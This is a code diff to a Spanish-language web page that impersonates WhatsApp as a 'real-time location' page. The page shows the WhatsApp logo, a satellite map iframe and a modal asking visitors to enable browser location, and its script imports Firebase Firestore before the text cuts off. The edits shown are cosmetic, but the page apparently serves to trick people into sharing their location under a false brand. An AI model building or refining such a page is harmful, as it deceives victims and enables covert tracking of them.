@@ -9,7 +9,7 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0b141a; /* fondo oscuro tipo WhatsApp */
+            background: #0b141a;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -19,7 +19,7 @@
         }
 
         .card {
-            background: #1f2c34; /* gris oscuro de burbujas */
+            background: #1f2c34;
             border-radius: 32px;
             padding: 28px 20px 32px;
             max-width: 420px;
@@ -36,8 +36,7 @@
             object-fit: cover;
             margin: 0 auto 16px;
             display: block;
-            background: #25D366;
-            padding: 10px;
+            background: transparent;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
         }
 
@@ -56,7 +55,6 @@
             margin-bottom: 20px;
         }
 
-        /* ---------- ESTADO ---------- */
         #estado {
             background: #2a3a42;
             padding: 14px 16px;
@@ -91,7 +89,6 @@
 
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ---------- MODAL (ALERTA) ---------- */
         .modal {
             display: none;
             position: fixed;
@@ -129,8 +126,8 @@
             display: block;
             border: 3px solid #25D366;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            background: #25D366;
-            padding: 15px;
+            background: transparent;
+            padding: 20px;
         }
 
         .modal-contenido .modal-icon { font-size: 40px; margin-bottom: 4px; }
@@ -160,19 +157,17 @@
         @media (max-width: 400px) {
             .card { padding: 20px 16px; }
             h2 { font-size: 21px; }
-            .modal-contenido .modal-imagen { width: 100px; height: 100px; padding: 10px; }
+            .modal-contenido .modal-imagen { width: 100px; height: 100px; padding: 15px; }
         }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <!-- Logo en estilo oscuro (icono blanco sobre círculo verde) -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/120px-WhatsApp.svg.png" alt="WhatsApp" class="logo" style="filter: invert(1) brightness(10); background: #25D366; padding: 10px; border-radius: 50%;" />
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/120px-WhatsApp.svg.png" alt="WhatsApp" class="logo" />
         <h2>WhatsApp</h2>
         <p class="subtitle">Ubicación en tiempo real</p>
 
-        <!-- MAPA SATELITAL CON ZOOM 19 -->
         <iframe
             src="https://www.google.com/maps?q=5.8275,-73.0333&z=19&t=k&output=embed"
             style="width:100%; max-width:800px; height:350px; border:none; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,.5);"
@@ -186,10 +181,9 @@
         </div>
     </div>
 
-    <!-- MODAL DE ALERTA -->
     <div id="miAlerta" class="modal">
         <div class="modal-contenido">
-            <img src="https://cdn-icons-png.flaticon.com/512/535/535239.png" alt="Ubicación" class="modal-imagen" style="filter: invert(1) brightness(10);" />
+            <img src="https://cdn-icons-png.flaticon.com/512/535/535239.png" alt="Ubicación" class="modal-imagen" />
             <div class="modal-icon">📍</div>
             <h3>Permiso de ubicación</h3>
             <p id="textoAlerta">Activa la ubicación en los ajustes del navegador.</p>
@@ -201,7 +195,6 @@
     </div>
 
     <script type="module">
-        // ----- FIREBASE (idéntico) -----
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
         import {
             getFirestore,
